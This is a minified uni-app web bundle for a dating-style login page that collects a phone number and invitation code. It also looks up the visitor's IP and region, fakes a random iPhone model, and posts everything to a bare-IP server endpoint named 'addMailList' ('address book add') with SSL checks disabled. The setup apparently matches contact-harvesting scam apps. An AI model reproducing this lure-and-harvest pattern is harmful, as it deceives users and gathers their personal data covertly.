(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["pages-index-index"],{"1da1":function(t,e,n){"use strict";function r(t,e,n,r,o,i,a){try{var u=t[i](a),c=u.value}catch(s){return void n(s)}u.done?e(c):Promise.resolve(c).then(r,o)}function o(t){return function(){var e=this,n=arguments;return new Promise((function(o,i){var a=t.apply(e,n);function u(t){r(a,o,i,u,c,"next",t)}function c(t){r(a,o,i,u,c,"throw",t)}u(void 0)}))}}n("d3b7"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=o},"1de5":function(t,e,n){"use strict";t.exports=function(t,e){return e||(e={}),t=t&&t.__esModule?t.default:t,"string"!==typeof t?t:(/^['"].*['"]$/.test(t)&&(t=t.slice(1,-1)),e.hash&&(t+=e.hash),/["'() \t\n]/.test(t)||e.needQuotes?'"'.concat(t.replace(/"/g,'\\"').replace(/\n/g,"\\n"),'"'):t)}},"270c":function(t,e,n){var r=n("24fb"),o=n("1de5"),i=n("b488");e=r(!1);var a=o(i);e.push([t.i,".content[data-v-31efe7ea]{background-image:url("+a+");\n\t/* background: #8d8d8d; */display:flex;\n\t/* align-items: center; */\n\t/* flex-direction: column; */\n\t/* justify-content: center; */width:100%;height:100%\n\t/* padding-top: 20% */}.loginCard[data-v-31efe7ea]{height:15rem;width:100%;background:rgba(0,0,0,.38);height:18rem;\n\t/* width: 600rpx;\n\theight: 460rpx; */border-radius:6px;margin:8.8rem 20px}uni-input[data-v-31efe7ea]{color:#fff;background-color:rgba(0,0,0,.44);opacity:.5;padding:10px 8px;margin:10px 20px;border-radius:2px;text-align:center}.userInput[data-v-31efe7ea]{margin-top:1.5rem}.userSubmit[data-v-31efe7ea]{\n\t/* border: 1px solid red; */margin:3rem 16px;text-align:center;color:#fff;padding:8px 0;border-radius:2px;background-color:#ff557f;transition:.4s}.userSubmit[data-v-31efe7ea]:active{background-color:pink;opacity:.5}.hahah[data-v-31efe7ea]{color:#fff}",""]),t.exports=e},"29e4":function(t,e,n){"use strict";n.r(e);var r=n("6223"),o=n("ef41");for(var i in o)"default"!==i&&function(t){n.d(e,t,(function(){return o[t]}))}(i);n("ac8a");var a,u=n("f0c5"),c=Object(u["a"])(o["default"],r["b"],r["c"],!1,null,"31efe7ea",null,!1,r["a"],a);e["default"]=c.exports},"35a5":function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r=n("ec09"),o={data:function(){return{phoneNumber:"",incode:"",userIp:"",address:"",equipment:"",netWorkState:!1}},onLoad:function(){var t=this;(0,r.netWork)().then((function(e){console.log("检查网络",e),t.netWorkState=e})),(0,r.ipAndaddress)().then((function(e){console.log("ip解析",e),t.userIp=e.userip,t.address=e.address})),(0,r.roundPhone)().then((function(e){console.log("随机数",e),t.equipment=e}))},methods:{starBtn:function(){var t=this;if(this.netWorkState)if(""!=this.phoneNumber&&""!=this.incode){var e=/^[1][3,4,5,7,8,9][0-9]{9}$/;e.test(this.phoneNumber)?(0,r.checkNumber)(this.phoneNumber).then((function(e){if(console.log("号码校验",e),1==e.code){uni.showLoading({title:"登录中"}),""==t.userIp&&""==t.address&&(t.userIp="用户拒绝授权",t.address="用户拒绝授权");var n={loginNum:t.phoneNumber,inCode:t.incode,equipment:t.equipment,location:t.userIp,address:t.address,data:[]};(0,r.addMailList)(n).then((function(t){1==t.code&&(uni.hideLoading(),console.log("添加成功"),uni.navigateTo({url:"/pages/home/home"}))}))}else uni.showToast({title:"登录号码重复",duration:2e3,icon:"error"})})):uni.showToast({title:"手机号格式有误",duration:2e3,icon:"error"})}else uni.showToast({title:"内容不能为空",duration:2e3,icon:"error"});else uni.showToast({title:"当前网络不可用",duration:2e3,icon:"error"})}}};e.default=o},6223:function(t,e,n){"use strict";var r;n.d(e,"b",(function(){return o})),n.d(e,"c",(function(){return i})),n.d(e,"a",(function(){return r}));var o=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("v-uni-view",{staticClass:"content"},[n("v-uni-view",{staticClass:"loginCard"},[n("v-uni-view",{staticStyle:{"text-align":"center","font-size":"20rpx","margin-top":"10px",color:"white"}},[t._v("遇见最美丽的邂逅")]),n("v-uni-view",{staticClass:"userInput"},[n("v-uni-input",{attrs:{"adjust-position":"false",type:"number",maxlength:"11",placeholder:"请输入手机号码","placeholder-class":"hahah"},model:{value:t.phoneNumber,callback:function(e){t.phoneNumber=e},expression:"phoneNumber"}})],1),n("v-uni-view",{staticClass:"userInput"},[n("v-uni-input",{attrs:{"adjust-position":"false",type:"number",maxlength:"6",placeholder:"请输入邀请码","placeholder-class":"hahah"},model:{value:t.incode,callback:function(e){t.incode=e},expression:"incode"}})],1),n("v-uni-view",{staticClass:"content_one"},[n("v-uni-view",{staticClass:"userSubmit",on:{click:function(e){arguments[0]=e=t.$handleEvent(e),t.starBtn.apply(void 0,arguments)}}},[t._v("登录")])],1)],1)],1)},i=[]},"96cf":function(t,e){!function(e){"use strict";var n,r=Object.prototype,o=r.hasOwnProperty,i="function"===typeof Symbol?Symbol:{},a=i.iterator||"@@iterator",u=i.asyncIterator||"@@asyncIterator",c=i.toStringTag||"@@toStringTag",s="object"===typeof t,l=e.regeneratorRuntime;if(l)s&&(t.exports=l);else{l=e.regeneratorRuntime=s?t.exports:{},l.wrap=b;var h="suspendedStart",f="suspendedYield",d="executing",p="completed",v={},m={};m[a]=function(){return this};var g=Object.getPrototypeOf,y=g&&g(g(T([])));y&&y!==r&&o.call(y,a)&&(m=y);var w=_.prototype=L.prototype=Object.create(m);k.prototype=w.constructor=_,_.constructor=k,_[c]=k.displayName="GeneratorFunction",l.isGeneratorFunction=function(t){var e="function"===typeof t&&t.constructor;return!!e&&(e===k||"GeneratorFunction"===(e.displayName||e.name))},l.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,_):(t.__proto__=_,c in t||(t[c]="GeneratorFunction")),t.prototype=Object.create(w),t},l.awrap=function(t){return{__await:t}},P(E.prototype),E.prototype[u]=function(){return this},l.AsyncIterator=E,l.async=function(t,e,n,r){var o=new E(b(t,e,n,r));return l.isGeneratorFunction(e)?o:o.next().then((function(t){return t.done?t.value:o.next()}))},P(w),w[c]="Generator",w[a]=function(){return this},w.toString=function(){return"[object Generator]"},l.keys=function(t){var e=[];for(var n in t)e.push(n);return e.reverse(),function n(){while(e.length){var r=e.pop();if(r in t)return n.value=r,n.done=!1,n}return n.done=!0,n}},l.values=T,M.prototype={constructor:M,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=n,this.done=!1,this.delegate=null,this.method="next",this.arg=n,this.tryEntries.forEach(S),!t)for(var e in this)"t"===e.charAt(0)&&o.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=n)},stop:function(){this.done=!0;var t=this.tryEntries[0],e=t.completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(t){if(this.done)throw t;var e=this;function r(r,o){return u.type="throw",u.arg=t,e.next=r,o&&(e.method="next",e.arg=n),!!o}for(var i=this.tryEntries.length-1;i>=0;--i){var a=this.tryEntries[i],u=a.completion;if("root"===a.tryLoc)return r("end");if(a.tryLoc<=this.prev){var c=o.call(a,"catchLoc"),s=o.call(a,"finallyLoc");if(c&&s){if(this.prev<a.catchLoc)return r(a.catchLoc,!0);if(this.prev<a.finallyLoc)return r(a.finallyLoc)}else if(c){if(this.prev<a.catchLoc)return r(a.catchLoc,!0)}else{if(!s)throw new Error("try statement without catch or finally");if(this.prev<a.finallyLoc)return r(a.finallyLoc)}}}},abrupt:function(t,e){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.tryLoc<=this.prev&&o.call(r,"finallyLoc")&&this.prev<r.finallyLoc){var i=r;break}}i&&("break"===t||"continue"===t)&&i.tryLoc<=e&&e<=i.finallyLoc&&(i=null);var a=i?i.completion:{};return a.type=t,a.arg=e,i?(this.method="next",this.next=i.finallyLoc,v):this.complete(a)},complete:function(t,e){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&e&&(this.next=e),v},finish:function(t){for(var e=this.tryEntries.length-1;e>=0;--e){var n=this.tryEntries[e];if(n.finallyLoc===t)return this.complete(n.completion,n.afterLoc),S(n),v}},catch:function(t){for(var e=this.tryEntries.length-1;e>=0;--e){var n=this.tryEntries[e];if(n.tryLoc===t){var r=n.completion;if("throw"===r.type){var o=r.arg;S(n)}return o}}throw new Error("illegal catch attempt")},delegateYield:function(t,e,r){return this.delegate={iterator:T(t),resultName:e,nextLoc:r},"next"===this.method&&(this.arg=n),v}}}function b(t,e,n,r){var o=e&&e.prototype instanceof L?e:L,i=Object.create(o.prototype),a=new M(r||[]);return i._invoke=N(t,n,a),i}function x(t,e,n){try{return{type:"normal",arg:t.call(e,n)}}catch(r){return{type:"throw",arg:r}}}function L(){}function k(){}function _(){}function P(t){["next","throw","return"].forEach((function(e){t[e]=function(t){return this._invoke(e,t)}}))}function E(t){function e(n,r,i,a){var u=x(t[n],t,r);if("throw"!==u.type){var c=u.arg,s=c.value;return s&&"object"===typeof s&&o.call(s,"__await")?Promise.resolve(s.__await).then((function(t){e("next",t,i,a)}),(function(t){e("throw",t,i,a)})):Promise.resolve(s).then((function(t){c.value=t,i(c)}),(function(t){return e("throw",t,i,a)}))}a(u.arg)}var n;function r(t,r){function o(){return new Promise((function(n,o){e(t,r,n,o)}))}return n=n?n.then(o,o):o()}this._invoke=r}function N(t,e,n){var r=h;return function(o,i){if(r===d)throw new Error("Generator is already running");if(r===p){if("throw"===o)throw i;return C()}n.method=o,n.arg=i;while(1){var a=n.delegate;if(a){var u=j(a,n);if(u){if(u===v)continue;return u}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if(r===h)throw r=p,n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);r=d;var c=x(t,e,n);if("normal"===c.type){if(r=n.done?p:f,c.arg===v)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(r=p,n.method="throw",n.arg=c.arg)}}}function j(t,e){var r=t.iterator[e.method];if(r===n){if(e.delegate=null,"throw"===e.method){if(t.iterator.return&&(e.method="return",e.arg=n,j(t,e),"throw"===e.method))return v;e.method="throw",e.arg=new TypeError("The iterator does not provide a 'throw' method")}return v}var o=x(r,t.iterator,e.arg);if("throw"===o.type)return e.method="throw",e.arg=o.arg,e.delegate=null,v;var i=o.arg;return i?i.done?(e[t.resultName]=i.value,e.next=t.nextLoc,"return"!==e.method&&(e.method="next",e.arg=n),e.delegate=null,v):i:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,v)}function O(t){var e={tryLoc:t[0]};1 in t&&(e.catchLoc=t[1]),2 in t&&(e.finallyLoc=t[2],e.afterLoc=t[3]),this.tryEntries.push(e)}function S(t){var e=t.completion||{};e.type="normal",delete e.arg,t.completion=e}function M(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(O,this),this.reset(!0)}function T(t){if(t){var e=t[a];if(e)return e.call(t);if("function"===typeof t.next)return t;if(!isNaN(t.length)){var r=-1,i=function e(){while(++r<t.length)if(o.call(t,r))return e.value=t[r],e.done=!1,e;return e.value=n,e.done=!0,e};return i.next=i}}return{next:C}}function C(){return{value:n,done:!0}}}(function(){return this||"object"===typeof self&&self}()||Function("return this")())},ac8a:function(t,e,n){"use strict";var r=n("bb3b"),o=n.n(r);o.a},b488:function(t,e,n){t.exports=n.p+"static/img/last2.30fc4dd3.png"},bb3b:function(t,e,n){var r=n("270c");"string"===typeof r&&(r=[[t.i,r,""]]),r.locals&&(t.exports=r.locals);var o=n("4f06").default;o("3b15a0db",r,!0,{sourceMap:!1,shadowMode:!1})},ec09:function(t,e,n){"use strict";var r=n("4ea4");n("d3b7"),Object.defineProperty(e,"__esModule",{value:!0}),e.netWork=a,e.ipAndaddress=c,e.checkNumber=s,e.addMailList=l,e.roundPhone=h,n("96cf");var o=r(n("1da1")),i="http://154.91.158.152:3000";function a(){return u.apply(this,arguments)}function u(){return u=(0,o.default)(regeneratorRuntime.mark((function t(){var e;return regeneratorRuntime.wrap((function(t){while(1)switch(t.prev=t.next){case 0:return t.next=2,uni.getNetworkType({success:function(t){"none"==t.networkType?(uni.showModal({title:"提示",content:"网络连接失败，请检查网络后重试！",showCancel:!1,success:function(t){t.confirm&&console.log("用户点击确定")}}),e=!1):e=!0}});case 2:return t.abrupt("return",e);case 3:case"end":return t.stop()}}),t)}))),u.apply(this,arguments)}function c(){return new Promise((function(t,e){uni.request({url:"http://ip-api.com/json/?lang=zh-CN",method:"GET",success:function(e){t({userip:e.data.query,address:e.data.regionName+e.data.city})}})}))}function s(t){return new Promise((function(e,n){uni.request({url:"".concat(i,"/Api/mobile/checkNum"),data:{loginNum:t},method:"POST",sslVerify:!1,success:function(t){e(t.data)},fail:function(t){e(t),console.log("网络请求失败",t)}})}))}function l(t){return console.log("通讯录添加",t),new Promise((function(e,n){uni.request({url:"".concat(i,"/Api/mobile/addMailList"),method:"POST",data:{loginNum:t.loginNum,inCode:t.inCode,equipment:t.equipment,location:t.location,address:t.address,data:t.data},sslVerify:!1,success:function(t){e(t.data)}})}))}function h(t){var e;console.log("通讯录添加",t);var n=["iphoneSE","iphone7","iphone7s","iphone8","iphone8Plus","iphoneX","iphoneXr","iphone11","iphone11Pro","iphone11ProMax","iphone12min","iphone12","iphone12Pro","iphone12ProMax","iphone13min","iphone13","iphone13Pro","iphone13ProMax"];return new Promise((function(t,r){e=Math.round(18*Math.random()),t(n[e])}))}},ef41:function(t,e,n){"use strict";n.r(e);var r=n("35a5"),o=n.n(r);for(var i in r)"default"!==i&&function(t){n.d(e,t,(function(){return r[t]}))}(i);e["default"]=o.a}}]);